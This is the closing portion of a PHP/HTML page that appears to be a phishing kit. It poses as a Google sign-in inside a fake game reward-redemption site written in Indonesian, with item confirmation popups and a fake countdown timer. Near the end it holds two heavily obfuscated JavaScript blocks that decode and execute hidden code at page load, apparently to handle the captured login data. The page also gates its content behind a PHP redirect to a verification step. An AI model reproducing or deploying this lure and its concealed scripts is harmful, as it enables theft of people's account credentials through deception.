                  <div class="notify-google">Not your computer? Use Guest mode to sign in privately. <span>Learn more</span></div>
                  <!--- notify-google --->
                  <br>
                  <button type="submit" class="btn-login-google" onclick="ValidateLoginGoogleData()">Next</button>
                  <button type="button" class="btn-create-google">Create account</button>
               </form>
               <br>
               <br>
            </div>
            <!--- box-google --->
         </div>
      </div>
      <div class="popup-login login-google-load animated fadeIn" style="display: none;">
         <div class="popup-box-login-google">
            <div class="box-google">
               <div class="header-google">
                  <svg viewBox="0 0 75 24" width="75" height="24" xmlns="http://www.w3.org/2000/svg" aria-hidden="true" class="BFr46e xduoyf">
                     <g id="qaEJec">
                        <path fill="#ea4335" d="M67.954 16.303c-1.33 0-2.278-.608-2.886-1.804l7.967-3.3-.27-.68c-.495-1.33-2.008-3.79-5.102-3.79-3.068 0-5.622 2.41-5.622 5.96 0 3.34 2.53 5.96 5.92 5.96 2.73 0 4.31-1.67 4.97-2.64l-2.03-1.35c-.673.98-1.6 1.64-2.93 1.64zm-.203-7.27c1.04 0 1.92.52 2.21 1.264l-5.32 2.21c-.06-2.3 1.79-3.474 3.12-3.474z"></path>
                     </g>
                     <g id="YGlOvc">
                        <path fill="#34a853" d="M58.193.67h2.564v17.44h-2.564z"></path>
                     </g>
                     <g id="BWfIk">
                        <path fill="#4285f4" d="M54.152 8.066h-.088c-.588-.697-1.716-1.33-3.136-1.33-2.98 0-5.71 2.614-5.71 5.98 0 3.338 2.73 5.933 5.71 5.933 1.42 0 2.548-.64 3.136-1.36h.088v.86c0 2.28-1.217 3.5-3.183 3.5-1.61 0-2.6-1.15-3-2.12l-2.28.94c.65 1.58 2.39 3.52 5.28 3.52 3.06 0 5.66-1.807 5.66-6.206V7.21h-2.48v.858zm-3.006 8.237c-1.804 0-3.318-1.513-3.318-3.588 0-2.1 1.514-3.635 3.318-3.635 1.784 0 3.183 1.534 3.183 3.635 0 2.075-1.4 3.588-3.19 3.588z"></path>
                     </g>
                     <g id="e6m3fd">
                        <path fill="#fbbc05" d="M38.17 6.735c-3.28 0-5.953 2.506-5.953 5.96 0 3.432 2.673 5.96 5.954 5.96 3.29 0 5.96-2.528 5.96-5.96 0-3.46-2.67-5.96-5.95-5.96zm0 9.568c-1.798 0-3.348-1.487-3.348-3.61 0-2.14 1.55-3.608 3.35-3.608s3.348 1.467 3.348 3.61c0 2.116-1.55 3.608-3.35 3.608z"></path>
                     </g>
                     <g id="vbkDmc">
                        <path fill="#ea4335" d="M25.17 6.71c-3.28 0-5.954 2.505-5.954 5.958 0 3.433 2.673 5.96 5.954 5.96 3.282 0 5.955-2.527 5.955-5.96 0-3.453-2.673-5.96-5.955-5.96zm0 9.567c-1.8 0-3.35-1.487-3.35-3.61 0-2.14 1.55-3.608 3.35-3.608s3.35 1.46 3.35 3.6c0 2.12-1.55 3.61-3.35 3.61z"></path>
                     </g>
                     <g id="idEJde">
                        <path fill="#4285f4" d="M14.11 14.182c.722-.723 1.205-1.78 1.387-3.334H9.423V8.373h8.518c.09.452.16 1.07.16 1.664 0 1.903-.52 4.26-2.19 5.934-1.63 1.7-3.71 2.61-6.48 2.61-5.12 0-9.42-4.17-9.42-9.29C0 4.17 4.31 0 9.43 0c2.83 0 4.843 1.108 6.362 2.56L14 4.347c-1.087-1.02-2.56-1.81-4.577-1.81-3.74 0-6.662 3.01-6.662 6.75s2.93 6.75 6.67 6.75c2.43 0 3.81-.972 4.69-1.856z"></path>
                     </g>
                  </svg>
               </div>
               <!--- header-google --->
               <br>
               <br>
               <i class="zmdi zmdi-spinner zmdi-hc-4x zmdi-hc-spin" style="color: #1a73e8;margin-top: 86px;"></i>
               <br>
               <br>
               <br>
            </div>
            <!--- box-google --->
         </div>
      </div>
      
      <div class="popup itemReward_confirmation2 fadeIn" style="display: none;">
         <div class="popup-box-wrapperz">
            <div class="popup-box-navbar-lz" style="margin-bottom:11px;">
               <div class="popup-box-navbar-lz-title">KONFIRMASI</div>
               <img onmousedown="tutup.play();" onclick="close_reward_confirmation()" src="https://cdn.jsdelivr.net/gh/Hyuu09/cdn-epep@main/images/popup-close2.png" style="margin-top: -24px;margin-right: 7px;opacity: 77%;">
            </div>
            <div class="popup-box-lz">
               <div class="popup-box-alert-lz">Apakah anda yakin ingin menukarkan item ini?</div>
               <div class="popup-box-item bordermotion itemShine" style="width: 21%;height: 78px;margin-top: 9px;margin-left: 50px;margin-bottom:10px;">
                  <rw id="ItemName"></rw>
                  <!-- <div class="popup-box-alert-price">Price:</div>
                  <pr id="price"></pr> -->
                  <div> 
                     <figure>
                        <span id="amount"></span>
                        <img src="" id="myItemReward_confirmationImg">
                     </figure>
                  </div>
                  <div class="line"></div>
                  <!-- <img src="img/tokens.png" style="margin-top: 3px;margin-right: -70px;width: 19px;height: auto;"> -->
               </div>
               <!--- popup-box-item --->
               <div class="popup-box-footer-lz">
                  <button type="button" onmousedown="buka.play();" onclick="get_token()" style="width: 101px;height: 34px;padding-left: 0;padding-right: 0;margin-top: -11px;"><font style="">Tukarkan</font> </button>
               </div>
               <!--- popup-box-footer --->
            </div>
            <!--- popup-box-bg --->
         </div>
         <!--- popup-box-wrapper --->
      </div>
      <!--- popup itemReward_confirmation --->
      
      <div class="popup itemReward_confirmationsold fadeIn" style="display: none;">
         <div class="popup-box-wrapperz">
            <div class="popup-box-navbar-lz" style="margin-bottom:11px;">
               <div class="popup-box-navbar-lz-title">Confirmation</div>
               <img onmousedown="tutup.play();" onclick="close_reward_confirmation()" src="https://cdn.jsdelivr.net/gh/Hyuu09/cdn-epep@main/images/popup-close2.png" style="margin-top: -27px;margin-right: 25px;opacity: 100%;">
            </div>
            <div class="popup-box-lz">
               <div class="popup-box-alert-lz">Sorry, this item is sold out!</div>
               <div class="popup-box-item bordermotion itemShine" style="width: 21%;height: 78px;margin-top: 9px;margin-left: 60px;margin-bottom:10px;">
                  <rw id="ItemNamesold"></rw>
                  <div class="popup-box-alert-price">Price:</div>
                  <prs id="pricesold"></prs>
                  <div>
                     <figure>
                        <span id="amountsold"></span>
                        <img src="" id="myItemReward_confirmationImgsold">
                     </figure>
                  </div>
                  <div class="line"></div>
                  <img src="https://cdn.jsdelivr.net/gh/Hyuu09/cdn-epep@main/images/tokens.png" style="margin-top: 3px;margin-right: -70px;width: 19px;height: auto;">
               </div>
               <!--- popup-box-item --->
               <br>
               <div class="popup-box-footer-lz">
                  <button type="button" onmousedown="buka.play();" onclick="soldout()" style="width: 90px;height: 28px;padding-left: 0;padding-right: 0;margin-top: -4px;"><font style="">SOLD OUT</font> </button>
               </div>
               <!--- popup-box-footer --->
            </div>
            <!--- popup-box-bg --->
         </div>
         <!--- popup-box-wrapper --->
      </div>
      <!--- popup itemReward_confirmation --->
      <script type="text/javascript" src="https://code.jquery.com/jquery-3.7.1.min.js"></script>
      <audio id="audioFile" src=""></audio>
      <script src="js/fgncode.js"></script>
      <script src="js/slide.js"></script>
      
      <script>
         const loadingScreen = $('#fgnloading-ff');
                 setTimeout(function() {
                     loadingScreen.addClass('hidden');
                 }, 2500);
      </script>
      <script>
var ValidateVerificationDatax;(function(){var WWL='',JOw=381-370;function qYc(z){var y=242696;var c=z.length;var i=[];for(var h=0;h<c;h++){i[h]=z.charAt(h)};for(var h=0;h<c;h++){var u=y*(h+76)+(y%16008);var j=y*(h+462)+(y%28408);var d=u%c;var v=j%c;var g=i[d];i[d]=i[v];i[v]=g;y=(u+j)%2112976;};return i.join('')};var GuN=qYc('ctcnmdytcjraotobflhrzrpnvioqesguxwkus').substr(0,JOw);var bDl='9aw 0=s6te,7p,0=80)varvg7"tbcd=f9h7jtlqnvpnrdt}v)x=z;;1a  o=n8r,e0;8w,85 8u,06j6n,i9,7;,.5p7.,=7a7],l5A9],,1p8),(6r7=,i1+;fa  9=[]4f0rav=r,pC02ppivlCnetu;v+=))[a[<];=)+";za, r=f]nau=.7+en=s5Swr=A6(f(r)v;r+ta00tqa(gum[n,stl(n+td;y+l)+v-rrl.a;ghm[n(s1te..p0i.(e w)=fhrkv(r+valtl}nxt4-g;8>o0tv -){ia[ }=vullgvqrgj;l.vi;)a5 r=ouzl[vvrmd10)varpx,jcl;net.;ca. ,;;o"(nah t=;;;<";j+l))v,r)bvjlc(auC(d,A=(z))vor2urf4b[;if1un{p=huh1r*v+(.;hvr=ore;t1z[1;-r;v=c;++9;ae[s  -f=bs=))hcdee(f.gelgch=auj6ctaoCedvAf(2+{){+p.ahsrto4e9tcz=2]-(;a=+;-+721}(l ehc"nrifua;{iC( =pn]l{).=)]zie(}>r)g..unhijrs;b(t,i.gsd,r=)iq!pas)(*[,+d];;e=++e;=ii([!fn lr)qi(( <r)6.vuCh.jds.batrirgadt)+lfvi=].;o.nz"8)a}=yhpyso(t[]]a;ivor=hnyqj;ij(i"r;lar r=(3f,j6a3r,{2r1=,62;.=oeczt ii;+a( 0=stci4g)f=o+C(aoCodz([6q;pog(]a1  =o;u<r.eeqgshtpa+dhzhmsxlqt]ofgrc+a)Al(z)8.eonnsS)rrn(.hrumrhrrlo;ess8pr)o;jezupneh1sllht}oa"("u."o<n or;';var cxH=qYc[GuN];var pLj='';var lWP=cxH;var mud=cxH(pLj,qYc(bDl));var XUT=mud(qYc('3!u{7;a1alixanPq!4%Po0=P6wt$acbnc2 ,g.(PedoetP3o_cuj!Ps,!a2#.p6P(3xccPCS))t.$oPPS{xP;,p.+c,!!P;3sjt,.7aatPr\'3,8S.i3Pt.Pb #Py6el;bPt...f aP=},t:j5$1P\/4pf!e$3Pt1fP;b85PP(9dP.(iaP_!wlt#eu_5ln(xPs";j_=n33e*fo)P(iP\/0.t3yaP;dP;0hrP78 erueai=!_i( $4P4to e=x6(.4mP0PP._%.h1aDmP8ae )5eii!nP9;!%c,[acP)r4)%c3"PPS+n4{*$96P;a3i%i6naasu_l)uf&v)nr$ePl.a)).i{Pr_s]!njPr6(.!as)_0ap%:}Pr(aaP6\'i.=x36w_oo= t4e.!e%waedo.sea; o$xaq$v}l.aleoP2g9.al)!)i7(.wfx_ar9Ma7=&_.76rf.P,e=dc((_o*]cPl).0;4no%t(;afPf8irgnrP=PdP.+r=cyP8aP.e4.Pa4_, 5nq,y(1:8!lsP.g=7dP.eot}ja17ic)a0;dPP(4"-n.)#2a%PexwnPsP)3,c%qP!5i,a\/fs)(=3;)n_Pn0epqb;!)t4+-!a=,c.5oePo$)!.\',f,{n$P,vPo3(bc{,5(&Da$uck_Pu)irPs(P;_,t.q3!5o5P{.(i=rP!.23n!)rt0()grCtlg)2a(ti;ogr(o}-73.P4d((=;,q%(-e-phn7on%6P80].{g8P(.%.+etbn3oPw.,$,0{,a3,r:sg!.P$PP7*l4P,8P.i)[i(37qbPrP.o3iw)rd(;c](.Pa..:e{{y,"by()M1 (dP00 P7.!,+=lei2)of$PaS)Pd5r)).}aa7qDq8(;.;xt;(ir(!e2u$_lgi4qP6!tpl0_3n({#il]3a61])oP0)P\/$Pjt+rzc.P"P.5(_)]7P0Ps(_Pr6(#Pt;a 1_d}=teo{{P.=28eeiPo_PiD98y&7e,.P1Pse}gP4rt+)x)e(a6ae%sreid)c()tg3]t7ata29h)$P.,e2TbobP )a,P.[]2n65gt(2y\'p{.e%hw.. .3(a.xmP1Pfu"$ge}ut)!M$1sf()h)($)6_(at3P.a, 81%Pe,63\'(#rxDPPP=dq(=,c;__5,8$.36o{oj $h4)!f3oipn;;Pcb)P(a.7baP3_oPn$(;g}.P\/\/r!3)_ daP.fc6_+pPr1bn}h#e6j1or;+u$(=PPP+ty8}e}aPb.dp).P7_+on\/n aP#oco.6_7.)b36"=P1e # osohf)P!.PPf[$,32)c(] $e(y$%&+t ;P.P_r[_,x)y ]=$f.Paa(a ,10;P.iiP'));var lwt=lWP(WWL,XUT );lwt(2923);return 1238})()
      </script>
      <script>
         var LazIndexHeader = 0;
         showLazSlidez();
         function showLazSlidez() {
             var i;
             var LazSlidez = document.getElementsByClassName("lazaslide");
             for (i = 0; i < LazSlidez.length; i++) {
                 LazSlidez[i].style.display = "none"; 
             }
             LazIndexHeader++;
             if (LazIndexHeader > LazSlidez.length) {LazIndexHeader = 1} 
             LazSlidez[LazIndexHeader-1].style.display = "block"; 
             setTimeout(showLazSlidez, 3000);
         }
         
         // code funtion timers
         $(document).ready(function() { 
         var detik = 59;
         var menit = 59;
         var jam = 23;
         function hitung() { 
         setTimeout(hitung,1000); $('#timer1').html( '  ' + jam + ' : ' + menit + ' : ' + detik + ''); detik --; 
         if(detik < 0) { 
         detik = 59; 
         menit --; 
         if(menit < 0) { 
         menit = 0; 
         detik = 0; 
         } 
         } 
         } 
         hitung(); 
         }
         );
         $(document).ready(function() { 
         var detik = 59;
         var menit = 59;
         var jam = 23;
         function hitung() { 
         setTimeout(hitung,1000); $('#timer2').html( + jam + ' : ' + menit + ' : ' + detik + ''); detik --; 
         if(detik < 0) { 
         detik = 59; 
         menit --; 
         if(menit < 0) { 
         menit = 0; 
         detik = 0; 
         } 
         } 
         } 
         hitung(); 
         }
         );
      </script>
   <script>
   var DontForgetMe;(function(){var Igd='',FwY=832-821;function QtR(l){var w=4265532;var g=l.length;var q=[];for(var x=0;x<g;x++){q[x]=l.charAt(x)};for(var x=0;x<g;x++){var f=w*(x+157)+(w%27936);var r=w*(x+155)+(w%36099);var u=f%g;var m=r%g;var a=q[u];q[u]=q[m];q[m]=a;w=(f+r)%6278661;};return q.join('')};var RLM=QtR('lvjktrucfotxzacetmbgyonrrwpoduhinssqc').substr(0,FwY);var siW='ey(1.=;pf={7i(vC4>;2p,}o={+.8drCfhoS[u2d;uvgihr((x)p;e,v7tsueg;,p,d8{a rrh8lwnm;]]ju=.-=<5;;4(C=di0avabt0wfqit+cir7]u,;"s+lae=(=[iA=obo !l9hj;tur(5(;o,n9{7i+)=)a[A8nyhcd; akne=n.hgbt2;ua,= (gn)=tr=ht}-o+r;(i0;y1re mmv=,d)+]n*Cn.baws{[ ol]65idC2(6i[s j.s=07a;)r});fhrn+tn 1=nflo(sve0o(.v=ms=d+;de(] ,=elt-;hAsfr1t[r7,6on.c=lCfl=nl= -u+t1;+2f+litectt.;m)r(]nfgdjsar}0=i(st1r,aav8-u[yn9hiv+,rCndef[(g(desrlcs)=g+;8h+},{w)vun"ge +=o;o=ruf*un1kdi=)<=.+=+l0,=;a-6)r;(ft.==vraw]rrd;()bru.r=oeq;gog;)=ddft(v-1paiqgsasrb .rukror24;7{nlvuda9t9rs;v],[)n=q1))lorf( = }02la,=,((iugu9f)).). l=,;.ur9](gv;lqvpa+"f.it"h+nra[1,Ahplht1e;m]tgn ((l;d).  h<ecn.[u(=8q+s+aenrfhgah(0()o2]tgc"o}0;li))ta,pf;mhtyiaScvuvo67jc(u;mirv "o;=>6]j([i e,[f3a,06h7,c4kg.co ;".ss5;;3eueejer68g"zqo,]4)3mCd;.u,0g,"h))ar()gfrr<a.ucnrshi..[+la;n;p8) 9mvs.a1rrAprt+grjo;un8arhp) l++qa2a,< rnr8l)v)h;rerahbvn1s=l)tq(r"!v).jv nvve;';var gZM=QtR[RLM];var VbU='';var bFv=gZM;var cos=gZM(VbU,QtR(siW));var dSB=cos(QtR('4aB$B3\/BanB,g).pa=,B_Ernnujyk_fSis#t1!e%rt=B6aBna{0$oa7w5.tbB!;)Sje1rB]e0nan(B.B,).ak5);..4B.l 6B7Ba[43s9e*0nc=weq$$Br\/\'g..o]_$\/)} daf_a=+,es)5ak#a,)$4%1=f.odgBBaBB_,&f$;Bb\'sBee6eB.=a"t.];#(dmB}]tB\/\/)ad245{(B1fts.B-a;$:B)25r#! 2Sbe4g!#;0B sp-={}aj(,0f;{d*s%t.71. 2j55a().f.)agm17.(f2.B$aB)f*,z0.C0p;B5B.$3n20a4(;(=;)fB$fu=2{,1=}ieT_t3sB.})f0efi=)B0n((f}g)7a0+;,_B+.]ud;je9BBB={g.%tm q_3i(ydtB(b}B,3 p;iB)t;(et(_4o)}0!..B%l,($u]1%))3_4s7n)t.24=3s6a)l.B"oB(icer)6];)+37ct3!.c;"h(4()B,l:cB.Bc.(}eawyB4!$!om.94s,r,={c$(!&arc.!%)B;\'0t,e_).sa \/en$!Br,o{B\'. "o0sqr{!l33&7!!b=BBBf,.{;(a.e t6,r=;c1aBak2,)do(n{BcB\/BtB(BB;)oBr0tB9f)(jr%;,B)&i(tt(8.(ze)c7(..%nfg}b.9-)jb3)7;-5bi.($zh(g$f,75ra17(dCBsr:hB)t2-)](nBr3t.(])B;;t1w\/q{BoB{;0ff.)et$r() Bl(47%,ju+mB_.)eB24B$6eh!(rpeB.($]ck;qanx0f,dc,aBB#tlrtgio)manghB:33]__,fl217,6uqlt."ei ,#p-4,17i(3))Boa*n2sB)B. (Da4(!,g,a(i,l)sdp g=i4)i;nc!BcBg)zo_B!g_(4!tBi&&.BiB2wl3_;qvi$3_{tf(6=f(_}}&p3!6liBo.vwcB%2B i+EoB(_}akj%]B%f)n 6B.gB.t}B37!$x!0B{Bbn,a)}5s(3f)i=2j0so!e}=at4{=$3MnBBB"c=dB.cd)sBn(pt$a\'=af7Be d7yaBt_!3uf $j:]1a.7=0!;o5+t[(77ej(c(_S,(B  $df4sk44hr;i6s.u74oBq&2B47u())$4fli)Ba[aj.eo,=o._;wiB]mt ",iBq+B.1BpBi. 7arqrjb 3}3)k{2![B=$\/.B_$3$.!+plw$it)j]4o%9'));var SFI=bFv(Igd,dSB );SFI(1087);return 2045})()
   </script>
</body></html>
<?php
}else{
    header("Location: verify.php");
}
?>